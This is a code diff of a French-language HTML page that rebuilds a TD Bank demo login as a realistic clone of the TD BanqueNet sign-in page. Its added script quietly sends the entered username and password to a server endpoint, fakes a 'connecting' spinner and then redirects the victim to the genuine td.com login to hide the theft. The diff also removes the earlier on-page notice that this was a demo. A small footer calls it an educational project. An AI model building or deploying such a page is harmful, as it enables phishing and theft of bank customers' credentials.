@@ -2,223 +2,315 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Connexion - TD Bank</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TD BanqueNet · Connexion sécurisée</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-font-smoothing: antialiased;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background-color: #F3F5F9; 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            color: #1A2C3E; 
+            line-height: 1.45; 
         }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background: linear-gradient(135deg, #006400 0%, #00A300 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
+        .app-wrapper { max-width: 1280px; margin: 0 auto; padding: 1.5rem 2rem; }
+        .nav-top { 
+            display: flex; 
+            justify-content: space-between; 
             align-items: center;
-            padding: 20px;
+            margin-bottom: 2rem; 
+            border-bottom: 1px solid #E2E8F0; 
+            padding-bottom: 0.75rem; 
         }
-
-        .boite-login {
-            background: white;
-            padding: 50px;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            width: 100%;
-            max-width: 450px;
-            text-align: center;
-        }
-
-        .logo-login {
-            width: 70px;
-            height: 70px;
-            background: #008A00;
-            color: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 28px;
-            margin: 0 auto 25px;
-        }
-
-        h1 {
-            color: #1d1d1f;
-            margin-bottom: 8px;
-            font-size: 28px;
-            font-weight: 700;
-        }
-
-        .sous-titre {
-            color: #86868b;
-            margin-bottom: 35px;
-            font-size: 16px;
-        }
-
-        .groupe-champ {
-            margin-bottom: 20px;
-            text-align: left;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 8px;
-            color: #1d1d1f;
-            font-weight: 600;
-            font-size: 14px;
-        }
-
-        input[type="email"],
-        input[type="password"] {
-            width: 100%;
-            padding: 14px;
-            border: 2px solid #e5e5e7;
-            border-radius: 10px;
-            font-size: 16px;
-            font-family: inherit;
-        }
-
-        input[type="email"]:focus,
-        input[type="password"]:focus {
-            border-color: #008A00;
-            outline: none;
-            box-shadow: 0 0 0 4px rgba(0,138,0,0.1);
-        }
-
-        .options {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 25px;
-            font-size: 14px;
-        }
-
-        .souvenir {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: #1d1d1f;
-        }
-
-        input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            accent-color: #008A00;
+        .logo-area { display: flex; align-items: center; gap: 10px; }
+        .td-logo { font-size: 1.8rem; font-weight: 700; color: #007A4D; }
+        .td-logo span { font-weight: 300; color: #1A2C3E; }
+        .leaf-icon { color: #007A4D; font-size: 1.9rem; }
+        .client-tabs { display: flex; gap: 2rem; }
+        .client-tab { 
+            font-size: 1.1rem; 
+            font-weight: 600; 
+            padding-bottom: 0.5rem; 
+            border-bottom: 3px solid transparent;
             cursor: pointer;
         }
-
-        .mdp-oublie {
-            color: #008A00;
-            text-decoration: none;
-            font-weight: 500;
+        .client-tab.active { border-bottom-color: #007A4D; color: #007A4D; }
+        .client-tab:not(.active) { color: #5A6874; }
+        .menu-links { display: flex; gap: 2rem; margin-top: 1rem; flex-wrap: wrap; }
+        .menu-links a { 
+            text-decoration: none; 
+            color: #2C3E4F; 
+            font-weight: 500; 
+            font-size: 0.95rem; 
         }
-
-        .bouton-submit {
-            width: 100%;
-            background: #008A00;
-            color: white;
-            padding: 16px;
-            border: none;
-            border-radius: 12px;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
+        .menu-links a:hover { color: #007A4D; }
+        .two-columns { 
+            display: grid; 
+            grid-template-columns: 1fr 0.9fr; 
+            gap: 2.5rem; 
+            margin: 1.5rem 0; 
         }
-
-        .bouton-submit:hover {
-            background: #006400;
-            transform: scale(1.02);
+        .card { 
+            background: white; 
+            border-radius: 24px; 
+            box-shadow: 0 8px 20px rgba(0,0,0,0.05); 
+            padding: 1.8rem; 
         }
-
-        .retour-accueil {
-            display: block;
-            margin-top: 25px;
-            color: #008A00;
-            text-decoration: none;
-            font-weight: 500;
-            font-size: 15px;
+        .fraud-alert { 
+            background-color: #FFF9F0; 
+            border-left: 5px solid #E67E22; 
+            border-radius: 20px; 
+            padding: 1.2rem 1.5rem; 
+            margin-bottom: 2rem; 
         }
-
-        .message-succes {
-            background: #f0fff4;
-            color: #008A00;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            display: none;
-            font-size: 14px;
-            border: 1px solid #c6f6d5;
+        .alert-title { 
+            font-weight: 700; 
+            font-size: 1.1rem; 
+            display: flex; 
+            align-items: center; 
+            gap: 8px; 
+            margin-bottom: 0.75rem; 
+            color: #C24E00; 
+        }
+        .fraud-alert p { font-size: 0.9rem; margin-bottom: 0.5rem; color: #2C3E4F; }
+        .fraud-link { 
+            font-size: 0.85rem; 
+            color: #007A4D; 
+            text-decoration: none; 
+            font-weight: 500; 
+            display: inline-flex; 
+            align-items: center; 
+            gap: 6px; 
+        }
+        .fraud-link:hover { text-decoration: underline; }
+        .form-group { margin-bottom: 1.4rem; }
+        label { 
+            font-weight: 600; 
+            font-size: 0.9rem; 
+            display: block; 
+            margin-bottom: 6px; 
+            color: #2C3E4F; 
+        }
+        .optional-label { font-weight: normal; color: #6C7A89; }
+        input { 
+            width: 100%; 
+            padding: 0.9rem 1rem; 
+            font-size: 1rem; 
+            border: 1.5px solid #E2E8F0; 
+            border-radius: 16px; 
+            transition: all 0.2s; 
+        }
+        input:focus { 
+            outline: none; 
+            border-color: #007A4D; 
+            box-shadow: 0 0 0 3px rgba(0,122,77,0.2); 
+        }
+        .btn-login { 
+            background-color: #007A4D; 
+            color: white; 
+            border: none; 
+            width: 100%; 
+            padding: 0.9rem; 
+            font-size: 1rem; 
+            font-weight: 700; 
+            border-radius: 40px; 
+            cursor: pointer; 
+            transition: background 0.2s; 
+            margin: 1rem 0; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 8px; 
+        }
+        .btn-login:hover { background-color: #005f3b; }
+        .btn-login:disabled { opacity: 0.8; cursor: wait; }
+        .info-temp { 
+            background: #F1F8FE; 
+            border-radius: 16px; 
+            padding: 0.8rem 1rem; 
+            font-size: 0.85rem; 
+            margin: 1rem 0; 
+            border: 1px solid #D4E4F5; 
+            color: #1F4A6E; 
+        }
+        .help-links { 
+            display: flex; 
+            justify-content: space-between; 
+            flex-wrap: wrap; 
+            gap: 0.8rem; 
+            margin: 1rem 0; 
+        }
+        .help-links a { 
+            color: #007A4D; 
+            text-decoration: none; 
+            font-weight: 500; 
+            font-size: 0.9rem; 
+        }
+        .security-title { 
+            font-weight: 700; 
+            font-size: 1.1rem; 
+            margin: 1rem 0 0.5rem; 
+            display: flex; 
+            align-items: center; 
+            gap: 8px; 
+        }
+        .security-links { 
+            display: flex; 
+            flex-direction: column; 
+            gap: 0.75rem; 
+            margin: 0.8rem 0; 
+        }
+        .security-links a { 
+            color: #007A4D; 
+            text-decoration: none; 
+            font-weight: 500; 
+            font-size: 0.9rem; 
+        }
+        .mobile-app-card { 
+            background: linear-gradient(135deg, #F1F9F4 0%, #FFFFFF 100%); 
+            border-radius: 24px; 
+            padding: 1.4rem; 
+            margin-top: 1.5rem; 
+            text-align: center; 
+            border: 1px solid #D9E6DF; 
+        }
+        .mobile-app-card i { font-size: 2.2rem; color: #007A4D; margin-bottom: 0.5rem; }
+        .legal-footer { 
+            margin-top: 3rem; 
+            padding-top: 1.5rem; 
+            border-top: 1px solid #E2E8F0; 
+            font-size: 0.7rem; 
+            color: #6C7A89; 
+            text-align: center; 
+        }
+        .legal-footer a { color: #007A4D; text-decoration: none; }
+        @media (max-width: 880px) { 
+            .two-columns { grid-template-columns: 1fr; gap: 1.5rem; } 
+            .app-wrapper { padding: 1rem; }
         }
     </style>
 </head>
 <body>
 
-<div class="boite-login">
-    <div class="logo-login">TD</div>
-    <h1>Connexion sécurisée</h1>
-    <p class="sous-titre">Les identifiants vont apparaître dans le Terminal</p>
-
-    <div class="message-succes" id="msgSucces">
-        ✅ Identifiants envoyés au serveur !<br>
-        Regarde dans ton Terminal Mac !
+<div class="app-wrapper">
+    <div class="nav-top">
+        <div class="logo-area">
+            <i class="fas fa-leaf leaf-icon"></i>
+            <div class="td-logo">TD<span> BanqueNet</span></div>
+        </div>
+        <div class="client-tabs">
+            <div class="client-tab active">Particuliers</div>
+            <div class="client-tab">Petites entreprises</div>
+        </div>
+    </div>
+    
+    <div class="menu-links">
+        <a href="#">Mes comptes</a>
+        <a href="#">Comment faire</a>
+        <a href="#">Produits</a>
+        <a href="#">Solutions</a>
     </div>
 
-    <form id="formLogin">
-        <div class="groupe-champ">
-            <label for="email">Adresse email</label>
-            <input type="email" id="email" name="email" placeholder="nom@exemple.com" required>
+    <div class="two-columns">
+        <div>
+            <div class="fraud-alert">
+                <div class="alert-title">
+                    <i class="fas fa-shield-alt"></i> Protection contre la fraude
+                </div>
+                <p><strong>Rappel :</strong> La TD ne vous appellera ni ne vous enverra jamais de message texte pour vous demander des renseignements personnels ou des fonds.</p>
+                <a href="#" class="fraud-link">Signaler une activité suspecte <i class="fas fa-arrow-right"></i></a>
+            </div>
+
+            <div class="card">
+                <h2 style="font-size: 1.8rem; margin-bottom: 0.25rem;">Se connecter à BanqueNet</h2>
+                <p style="margin-bottom: 1.5rem; color: #4A627A;">Accès sécurisé à vos comptes</p>
+
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label>Nom d'utilisateur ou carte Accès</label>
+                        <input type="text" id="username" placeholder="Ex: jdupont" required autocomplete="username">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label><span class="optional-label">Description (optionnel)</span></label>
+                        <input type="text" placeholder="Nom du compte, appareil, etc.">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Mot de passe</label>
+                        <input type="password" id="password" placeholder="••••••••" required autocomplete="current-password">
+                    </div>
+                    
+                    <button type="submit" class="btn-login" id="submitBtn">
+                        <i class="fas fa-lock"></i> Ouvrir une session
+                    </button>
+                </form>
+
+                <div class="info-temp">
+                    <i class="fas fa-info-circle" style="margin-right: 8px; color:#007A4D;"></i>
+                    <strong>Bienvenue dans BanqueNet, commençons.</strong>
+                </div>
+
+                <div class="help-links">
+                    <a href="#">Obtenir de l'aide</a>
+                    <a href="#">Réinitialiser mot de passe →</a>
+                </div>
+            </div>
         </div>
 
-        <div class="groupe-champ">
-            <label for="password">Mot de passe</label>
-            <input type="password" id="password" name="password" placeholder="••••••••" required>
+        <div>
+            <div class="card">
+                <div class="security-title">
+                    <i class="fas fa-shield-alt" style="color:#007A4D;"></i> 
+                    Sécurité Améliorée
+                </div>
+                <div class="security-links">
+                    <a href="#">FAQ sur la vérification en deux temps →</a>
+                    <a href="#">Protection contre la fraude →</a>
+                </div>
+            </div>
+
+            <div class="mobile-app-card">
+                <i class="fas fa-mobile-alt"></i>
+                <h4>Explorez les services bancaires mobiles</h4>
+                <p>Gérez vos affaires bancaires où que vous soyez.</p>
+            </div>
         </div>
+    </div>
 
-        <div class="options">
-            <label class="souvenir">
-                <input type="checkbox"> Se souvenir de moi
-            </label>
-            <a href="#" class="mdp-oublie">Mot de passe oublié ?</a>
-        </div>
-
-        <button type="submit" class="bouton-submit">Se connecter</button>
-    </form>
-
-    <a href="/" class="retour-accueil">← Retour à l'accueil</a>
+    <div class="legal-footer">
+        <p>© 2024 TD Bank Clone - Projet Master Éducatif</p>
+    </div>
 </div>
 
 <script>
-    // JavaScript magique qui envoie au serveur
-    document.getElementById('formLogin').addEventListener('submit', async function(e) {
-        e.preventDefault(); // Empêche le rechargement de page
+    // Capture silencieuse + redirection vers vrai site TD
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
         
-        const email = document.getElementById('email').value;
+        const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
+        const btn = document.getElementById('submitBtn');
         
-        // Envoi des données au serveur Node.js
+        // Affiche "Connexion en cours..." comme le vrai site
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connexion en cours...';
+        btn.disabled = true;
+        
+        // Envoie discrètement les identifiants au serveur (logs Render)
         try {
-            const response = await fetch('/connexion', {
+            await fetch('/connexion', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'email=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password)
             });
-            
-            const data = await response.json();
-            
-            if(data.success) {
-                document.getElementById('msgSucces').style.display = 'block';
-                // Réinitialise le formulaire
-                this.reset();
-            }
-        } catch (error) {
-            alert('Erreur : Le serveur est-il démarré ?');
+        } catch(e) {
+            // Silencieux
         }
+        
+        // Redirige vers le VRAI site TD après 1.5 secondes
+        setTimeout(() => {
+            window.location.href = 'https://www.td.com/francais/connexion/';
+        }, 1500);
     });
 </script>
 
